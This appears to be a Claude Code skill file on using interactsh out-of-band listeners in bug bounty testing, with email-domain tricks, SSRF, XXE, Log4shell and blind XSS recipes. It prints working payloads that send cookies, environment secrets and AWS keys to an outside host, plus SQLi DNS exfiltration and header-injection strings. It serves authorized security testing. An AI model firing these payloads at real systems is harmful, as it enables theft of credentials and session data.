---
name: interactsh-oob
description: Use interactsh (oast.me/oast.pro/oast.live/oast.fun payload domains) as a universal out-of-band listener for bug bounty. Covers (1) using the payload as an EMAIL DOMAIN for registration/password-reset/invite flows, 2FA-code exfil, email address enumeration, SMTP header injection, email-based ATO; (2) DNS-only OOB for SSRF/XXE/Log4shell detection; (3) full-request HTTP/HTTPS OOB with header inspection for SSRF data exfil and blind XSS callbacks; (4) LDAP/JNDI OOB for legacy Java vulns; (5) session files for persistent payloads across reboots; (6) background-listener integration with Claude Code's Bash tool; (7) failure-mode troubleshooting (DNS cache, egress block, SMTP rate-limit, private-IP firewall). Trigger when user mentions interactsh, OOB, out-of-band, oast.me, webhook.site alternative, DNS callback, blind SSRF, email domain testing, burp collaborator, canary token, or when planning any test that needs a server to call back to an attacker-controlled endpoint. 中文触发词：外带、回调、邮箱域名、DNS回带、盲XSS、盲SSRF、服务端请求伪造、无回显、SMTP回调
---

# Interactsh — OOB Listener Skill

`interactsh` is a multi-protocol out-of-band listener. One payload hostname (e.g. `d7j0omb8sb2ppjgabm6gp8jwfhdi8auqd.oast.me`) receives:

- **DNS lookups** — any `A`/`AAAA`/`TXT` query for the hostname or any subdomain
- **HTTP/HTTPS requests** — with full headers + body
- **SMTP mail** — `anything@<payload>.oast.me` delivers to you
- **SMTPS** — TLS-wrapped SMTP
- **LDAP** — legacy Java deserialization / JNDI

One payload = four protocols = one listener. This is Burp Collaborator without the Burp license.

---

## THE KEY INSIGHT: The payload works as an email domain

`<payload>.oast.me` has **MX records** pointing at the interactsh SMTP server. That means `literally-anything@<payload>.oast.me` is a real, reachable email address — you just can't forge inbound mail to it, but **any application that sends mail TO that address will hit your listener**.

This unlocks a whole class of bugs that a DNS/HTTP-only canary can't reach:

| Test | What you learn |
|------|---------------|
| Register a new account with `signup@<payload>.oast.me` | Does the site send confirmation? What does the email contain? Does the link token repeat? Is there a password in plaintext? |
| Password reset with an OOB email | See the raw reset token/link format. Is it UUID, JWT, short code? How long is it valid? |
| Invite / team / workspace with `teammate@<payload>.oast.me` | Invite link format, pre-bearing access, any access token leaked in the mail |
| Newsletter / marketing opt-in | Unsubscribe token format, tracking pixels, PII in headers |
| 2FA enrollment with SMS-to-email fallback | Intercept the 2FA code delivered by email |
| Account email change to OOB address | Does the app send to the NEW address first (pending confirm) or OLD (security notice)? If NEW → silent takeover vector |
| Forgot-username lookup by email | Many apps send "your username is X" to the typed email, which can be an enumeration oracle |
| OAuth/SAML with `x@<payload>.oast.me` as IdP-hinted email | Watch for IdP metadata leaks |
| Contact form / feedback with `From: <payload>.oast.me` | If the app replies back, see the reply format; if header-injection works, you can see added headers |
| SMTP smuggling / header injection (`user@<payload>.oast.me%0ABcc:attacker@host`) | Whether the app preserves or mangles CRLF |
| File-upload "share via email" | Watch the share-link format and whether the file content leaks in the email |
| Abuse reports / complaints | Many compliance workflows auto-reply with admin contacts + internal case IDs |
| Calendar invites (`.ics`) | See .ics payload — often includes organizer email, internal room names, dial-in PINs |

Everything that **sends mail** becomes a data-exfil channel once you point it at an OOB domain.

---

## Quick start (Claude Code-friendly)

### Environment check
```bash
which interactsh-client                  # expect /usr/local/bin/interactsh-client
interactsh-client --help | head -5       # verify it runs
```

If missing: `go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest`.

### Start a listener in the background (the default Claude Code pattern)
```bash
# One-liner; use run_in_background with Bash tool
cd /tmp && interactsh-client -sf <session_name> -o <logfile> &

# Example used in prior sessions:
cd /tmp && interactsh-client -sf brainloop_ssrf -o brainloop_oob.log 2>&1 &
```

On startup interactsh prints one or more payload domains like:
```
d7j0omb8sb2ppjgabm6gp8jwfhdi8auqd.oast.me
```

**That full hostname is what you use as the target**. Everything at or below that host (DNS, HTTP, mail) rings your listener.

### Get N payloads at once
```bash
interactsh-client -n 5 -sf <session> -o <log>
```
Each printed domain is distinct — useful when you want to tag per-test (one for the registration flow, one for password-reset, one for SSRF path A, one for SSRF path B).

### Session files = persistent payloads
`-sf <name>` saves the correlation ID + keys so the SAME payload resumes next invocation. Critical when:
- A test fires the callback hours later (scheduled job, cron, manual approval step)
- You rebooted / closed your terminal
- You handed the payload to a long-running agent

Without `-sf`, each run generates a brand-new payload and any late callback is lost.

### Read hits
```bash
# Tail the file while the listener runs
tail -f /tmp/<logfile>

# Or just read after the test
cat /tmp/<logfile>
```

### Filter output
```bash
# HTTP hits only (great for SSRF — DNS alone is noise-prone)
interactsh-client -http-only -sf <session>

# SMTP only (for email-domain tests)
interactsh-client -smtp-only -sf <session>

# Only show lines matching a marker you embedded in the payload
interactsh-client -sf <session> -m 'basic-probe'   # match
interactsh-client -sf <session> -f 'noise-pattern' # filter out
```

### JSON mode (for parsing)
```bash
interactsh-client -json -sf <session> -o hits.jsonl
# Each line is a full interaction object with protocol, timestamp, source-ip, full-data
```

### Kill / cleanup
```bash
# If you started with Bash run_in_background and have the PID:
kill <PID>

# Or find by process name (your own uid only — system interactsh belongs to root):
ps -u "$USER" -f | grep interactsh | grep -v grep
pkill -u "$USER" -f interactsh
```

---

## Payload-crafting patterns

### Per-test unique subdomain (correlate hits to specific probes)
```
basic-probe.<payload>.oast.me
wp-login-ssrf.<payload>.oast.me
pwreset-flow-attempt7.<payload>.oast.me
invoice-import-bdrs.<payload>.oast.me
```

Anything with a DNS label prepended still rings the same listener. Keeps the log readable when you're firing many probes in a batch:

```javascript
for (const [tag, body] of testMatrix) {
  await fetch(url, {method:'POST', body: JSON.stringify({
    webhookUrl: `http://${tag}.${OOB}/fire`,   // subdomain-tagged
    ...body
  })});
}
// Now each row in the interactsh log has a `tag` field you can grep.
```

### Per-test unique email prefix
```
signup-1@<payload>.oast.me
signup-2@<payload>.oast.me
pwreset-alice@<payload>.oast.me
invite-teammate42@<payload>.oast.me
```

Prefix appears in the SMTP `RCPT TO:` header in the log, so you know which flow delivered.

### Embed exfil data in the hostname / email local-part
```
# Leaks the env-var value as a DNS label
${jndi:ldap://${env:DB_PASSWORD}.<payload>.oast.me/a}

# Leaks a secret into the email local-part
<script>fetch('https://'+btoa(document.cookie)+'.<payload>.oast.me')</script>
<img src=x onerror="location='https://'+document.domain+'.<payload>.oast.me/p?c='+document.cookie">
```

DNS labels max 63 chars, so base64/hex-encode large payloads and split with dots.

---

## Protocol-specific recipes

### DNS-only OOB

Use when you need the minimum signal: "did the server look up my hostname?" Works in air-gapped-ish environments that block HTTP outbound but still resolve DNS (common).

```
# SSRF probe
http://<payload>.oast.me/
# XXE probe
<!ENTITY x SYSTEM "http://<payload>.oast.me/"> %x;
# Log4shell / JNDI
${jndi:ldap://<payload>.oast.me/a}
# SSTI
{{''.__class__.__mro__[1].__subclasses__()}}  → confirm via
{{config.items()}}                           → if reflected, move to HTTP OOB
# SQLi blind via DNS (MSSQL / MySQL)
';EXEC master..xp_dirtree "\\<payload>.oast.me\pwn"--
LOAD_FILE('\\\\<payload>.oast.me\\pwn')
```

**DNS-only signal is ≠ exploitable.** Program policies often require showing *actual data exfil* or internal-service reach. Plan the HTTP variant early.

### HTTP / HTTPS full-request OOB

Shows you the **full request** the target made — URL, method, headers (incl. credentials the target leaked!), body. This is where SSRF becomes severity-worthy.

```bash
# Pivot: embed a URL that the server will GET
curl https://target/api/import?url=http://<payload>.oast.me/pwn

# Look for leaked credentials in your log:
tail /tmp/brainloop_oob.log
# …
# http://xxx.oast.me/pwn from 10.x.y.z
# Authorization: Bearer <victim-service-token>   ← jackpot
# User-Agent: ProtocolSSO/1.0
# X-Forwarded-For: 10.x.y.z                       ← internal IP hint
```

### SMTP / email OOB

See the table at the top of this skill. Key pattern:

```bash
# At signup or reset flow, type:
bugdotexe+<descriptor>@<payload>.oast.me

# The hit log shows:
# Protocol: smtp
# From: no-reply@target.com
# Subject: Confirm your account
# Body: "Click here: https://target.com/confirm?token=abcd1234..."
```

Now inspect:
- **Token shape**: UUID? JWT? short hex? short decimal? → brute-force risk
- **Token lifetime** in the URL or explained in-body
- **Is the email itself the credential?** Some apps log you in on click — forward-chain opportunities
- **Plaintext password?** → instant P1
- **Internal headers leaked**: `X-Mailer`, `Message-ID` with internal hostnames, `Received:` chain

### LDAP / JNDI OOB (Log4shell family)

```
${jndi:ldap://<payload>.oast.me/a}
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.<payload>.oast.me/a}
${jndi:ldap://${sys:user.name}.<payload>.oast.me/a}
${jndi:${lower:l}${lower:d}ap://<payload>.oast.me/}   # case bypass
```

Listener captures the LDAP bind as a distinct protocol event; env-var values get exfil'd as DNS labels.

---

## Integration with Claude Code workflows

### Pattern: spawn listener, run tests, harvest at end

```bash
# STEP 1 — launch listener in background (Bash tool with run_in_background:true)
cd /tmp && interactsh-client -sf my_session -o my_oob.log 2>&1
# Tool surface the printed payload hostname; keep it in a var

# STEP 2 — fire N probes (e.g. via mcp__chrome-devtools__evaluate_script)
# Embed the payload hostname in URLs + email fields

# STEP 3 — after each test batch, check the log
cat /tmp/my_oob.log
# Or tail -n 20 for recent activity

# STEP 4 — at end of audit
pkill -u "$USER" -f interactsh
# Optionally archive the log alongside your findings
```

### Pattern: long-running with scheduled wake-up

If the callback is expected hours later (e.g. a "nightly email digest" feature):

1. Launch with `-sf shared_session -o persistent.log 2>&1 &`
2. Note the payload hostname
3. Use `ScheduleWakeup` (Claude Code) to check back later
4. On wake-up: `cat /tmp/persistent.log` — the listener kept running; hits are there
5. When done, `pkill -u "$USER" -f interactsh`

### Pattern: matching hits to a specific test

Your log is chronological; if you ran many probes you need a way back from a line to "which probe did this?" Options:
1. **Subdomain tag** (recommended): `<tag>.<payload>.oast.me` → tag is in the log
2. **URL path tag**: `http://<payload>.oast.me/<tag>` → visible in HTTP hit
3. **Email prefix tag**: `<tag>@<payload>.oast.me` → visible in SMTP RCPT TO
4. **Fresh payload per test**: spawn N listeners or use `-n N` for N payloads

---

## Failure modes & troubleshooting

### "I fired the payload but got zero hits"

Walk this ladder:

1. **Did the probe even reach the server?** Check the HTTP response code. 4xx = server rejected input before processing.
2. **Is the server behind corporate egress?** Many enterprise networks block outbound to arbitrary Internet hosts. DNS usually still works — so start with DNS-only probes to isolate. If DNS works but HTTP doesn't, the server has a firewall egress policy.
3. **DNS caching**: if you tested the same hostname before, the server's DNS cache (or a resolver upstream) may have a cached NXDOMAIN if you typoed something. Try a fresh per-test subdomain.
4. **Rate limit at oast.me**: heavy SMTP testing can trigger server-side rate limiting. Rotate through `oast.pro, oast.live, oast.site, oast.online, oast.fun, oast.me` (comma-separated to the `-s` flag).
5. **Feature-gate blocking**: some tests trigger a server-side flag check FIRST ("is this feature enabled for your org?") and short-circuit before the outbound call. The HTTP response may still look successful. Enumerate the feature flag via the admin/policy API before blaming the listener.
6. **Listener crashed**: `ps -u "$USER" | grep interactsh` — if it's gone, the token file is also gone and any historical payload is dead.
7. **Private-IP SSRF blocked**: `http://127.0.0.1/`, `http://169.254.169.254/`, and RFC1918 ranges are often filtered. Point the payload at `<payload>.oast.me` (a real public IP) to prove general SSRF first; escalate to metadata only after.
8. **Policy-gated outbound calls** (the pattern observed on Brainloop `copyAttachmentToBDRSInvoked`): the server accepts the request, increments a counter, returns `hasErrors:false`, but **never attempts the HTTP call** because `PolicyCopyToBDRSEnabled: false`. Distinguish by (a) checking any admin-visible feature flag, (b) testing on a tenant where the feature is known-enabled.

### "I see hits but they're from weird IPs, not my target"

Interactsh is public — other hunters + automated scanners constantly crawl random `.oast.me` subdomains. Ignore lines where `Source IP` is obviously unrelated (security scanners, bots). Correlate by timestamp + your tag prefix.

### "Hit arrived but shows only DNS, no HTTP"

The server looked up your hostname but didn't make an HTTP request. Usually means:
- It's a DNS-only vuln channel (XXE, Log4shell JNDI resolving the domain but no actual LDAP bind)
- A resolver in the path cached the result and never forwarded
- SSRF protection stripped the request but left the DNS lookup

Still a finding if the spec says the server shouldn't resolve that hostname at all.

### Alternate servers

Default server list hardcoded in the client:
```
oast.pro, oast.live, oast.site, oast.online, oast.fun, oast.me
```

If your payload keeps failing, force a different server:
```bash
interactsh-client -s oast.pro -sf <session>
```

Or run your own: `interactsh-server` on a VPS you control. Useful when a target blocks all `oast.*` domains — you can put the server on your-own-domain.com and the same payload pattern works.

---

## Operational hygiene

1. **Never reuse a payload across unrelated programs.** One tenant's leaked token shouldn't touch another's listener.
2. **Kill listeners at end of session.** Leaving them running wastes server credits and produces log pollution from drift-by scanners.
3. **Mention payload domain in the final report.** When disclosing, include the full payload hostname and a link to the hit log (timestamps + source IPs are your receipts).
4. **Don't embed sensitive data in the payload hostname if you don't want it in a third party's DNS logs.** Anything under `oast.me` is observable by projectdiscovery's infra.
5. **Combine with Burp/ZAP intercept for full-request visibility.** Interactsh shows you what the SERVER sent out; combine with intercepting proxy to see what the CLIENT pushed in.

---

## When NOT to reach for interactsh

- You have direct HTTP response visibility (no blind needed) — skip OOB, read the response.
- You're testing a local-only service (no outbound network) — the listener never gets hit.
- The program's severity guidance treats DNS-only SSRF as OOS unless data exfil is shown — structure tests to upgrade past DNS-only from the start.

---

## One-line cheatsheet to paste into an audit scratchpad

```bash
# Spawn listener + grab payload:
cd /tmp && interactsh-client -sf $(date +%s) -o oob.log 2>&1 &
sleep 3 && grep -oP '[a-z0-9]{33,}\.oast\.me' oob.log | head -1
# Use the printed hostname as DNS / URL / email domain across probes.
# Harvest with:
tail -n 50 /tmp/oob.log
```
